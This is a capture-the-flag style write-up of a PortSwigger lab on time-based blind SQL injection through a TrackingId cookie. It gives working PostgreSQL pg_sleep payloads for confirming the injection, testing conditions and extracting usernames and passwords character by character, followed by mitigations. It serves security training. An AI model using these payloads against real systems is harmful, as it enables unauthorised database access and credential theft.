# SQL Injection – Time-based information retrival

# Vulnerability Overview
The application is vulnerable to SQL Injection via the TrackingId cookie. The database does not return query results or errors directly, but delays in response time can be used to infer data.

# Steps to Reproduce

**Lab Link** → https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

*Navigate to*
* /filter?category=Pets

*Identify injection point (Cookie)*

Intercept request using Burp Suite and modify TrackingId
* TrackingId=xyz'
* * No visible change

*Confirm time-based behavior*
* TrackingId=xyz' || pg_sleep(5)--
* * Response delayed by ~5 seconds → Confirms SQL execution

*Verify conditional delay (true condition)*

* TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
* * Delay observed → Condition TRUE

*Verify conditional delay (false condition)*

* TrackingId=xyz' || (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
* * No delay → Condition FALSE

*Extract data (example: first character of username)*

* TrackingId=xyz' || (SELECT CASE WHEN (SUBSTRING(username,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1)--
* * Delay → First character is 'a'
* * No delay → Try next character

*Repeat process*
* Iterate over characters to extract full username and password


# Why This Works
The pg_sleep(n) function pauses the database response for n seconds.
* If condition is TRUE → delay occurs
* If condition is FALSE → no delay
By observing response timing, an attacker can infer database values without direct output, making this a blind SQL injection technique.

# Payload Used
* '|| pg_sleep(5)--
* '|| (SELECT CASE WHEN (SUBSTRING(username,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1)--

# Impact
An attacker can extract sensitive data (usernames, passwords, tokens) without any visible errors, leading to full database compromise and account takeover.

# Tools Used
* Burp Suite (Proxy, Repeater, Intruder for automation)

# Mitigation
* Use parameterized queries / prepared statements
* Implement strict input validation
* Apply least privilege to database users
* Use query timeouts and anomaly detection
* Deploy WAF rules to detect injection patterns